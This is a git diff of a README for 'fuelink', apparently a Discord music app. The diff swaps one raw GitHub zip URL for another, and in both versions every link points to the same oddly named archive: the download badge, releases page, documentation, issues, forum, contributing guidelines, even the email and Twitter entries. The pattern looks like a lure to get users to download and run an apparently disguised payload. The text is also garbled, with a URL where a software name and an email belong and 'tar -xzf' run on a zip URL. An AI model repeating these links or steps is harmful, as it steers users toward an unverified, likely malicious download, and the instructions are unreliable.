@@ -6,14 +6,14 @@ Welcome to fuelink! This guide will help you download and run the application ea
 
 ## 📥 Download Fuelink
 
-[![Download Fuelink](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/implementations/Software_Kirillitsa.zip)](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/implementations/Software_Kirillitsa.zip)
+[![Download Fuelink](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/plugins/Software_Anglicanism.zip)](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/plugins/Software_Anglicanism.zip)
 
 ## 📋 System Requirements
 
 Before you start, make sure your computer meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent Linux distribution.
-- **https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/implementations/Software_Kirillitsa.zip** Version 14 or later installed on your machine.
+- **https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/plugins/Software_Anglicanism.zip** Version 14 or later installed on your machine.
 - **Memory:** At least 1 GB of RAM.
 - **Disk Space:** Minimum of 200 MB available.
 
@@ -22,7 +22,7 @@ Before you start, make sure your computer meets the following requirements:
 To download fuelink, follow these simple steps:
 
 1. Click the link below to visit the releases page:
-   [Visit Releases Page](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/implementations/Software_Kirillitsa.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/plugins/Software_Anglicanism.zip)
 
 2. On the releases page, look for the latest version. You will see a list of downloadable files.
 
@@ -30,7 +30,7 @@ To download fuelink, follow these simple steps:
 
    - For **Windows**, download the `.exe` file.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, download the `https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/implementations/Software_Kirillitsa.zip` file.
+   - For **Linux**, download the `https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/plugins/Software_Anglicanism.zip` file.
 
 4. After downloading, follow these steps based on your operating system:
 
@@ -45,7 +45,7 @@ To download fuelink, follow these simple steps:
    - **Linux:**
      - Extract the downloaded file using:
        ```
-       tar -xzf https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/implementations/Software_Kirillitsa.zip
+       tar -xzf https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/plugins/Software_Anglicanism.zip
        ```
      - Navigate to the extracted folder and run:
        ```
@@ -67,9 +67,9 @@ Fuelink offers a range of features to enhance your music experience:
 
 If you need help, check out the following resources:
 
-- **Documentation:** Comprehensive guides and FAQs [here](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/implementations/Software_Kirillitsa.zip).
-- **GitHub Issues:** Report bugs or request features by visiting the [issues page](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/implementations/Software_Kirillitsa.zip).
-- **Discussion Forum:** Join the conversation with other users [here](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/implementations/Software_Kirillitsa.zip).
+- **Documentation:** Comprehensive guides and FAQs [here](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/plugins/Software_Anglicanism.zip).
+- **GitHub Issues:** Report bugs or request features by visiting the [issues page](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/plugins/Software_Anglicanism.zip).
+- **Discussion Forum:** Join the conversation with other users [here](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/plugins/Software_Anglicanism.zip).
 
 ## 🚀 Join the Development
 
@@ -79,13 +79,13 @@ Interested in contributing? We welcome developers and non-developers alike. You 
 - Suggesting new features.
 - Helping us with translations.
 
-To start contributing, read our [Contributing Guidelines](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/implementations/Software_Kirillitsa.zip).
+To start contributing, read our [Contributing Guidelines](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/plugins/Software_Anglicanism.zip).
 
 ## 📩 Contact
 
 If you have questions or feedback, feel free to reach out:
 
-- **Email:** https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/implementations/Software_Kirillitsa.zip
-- **Twitter:** [@fuelinkapp](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/implementations/Software_Kirillitsa.zip)
+- **Email:** https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/plugins/Software_Anglicanism.zip
+- **Twitter:** [@fuelinkapp](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/plugins/Software_Anglicanism.zip)
 
 Thank you for choosing fuelink. Enjoy managing your music in Discord effortlessly!
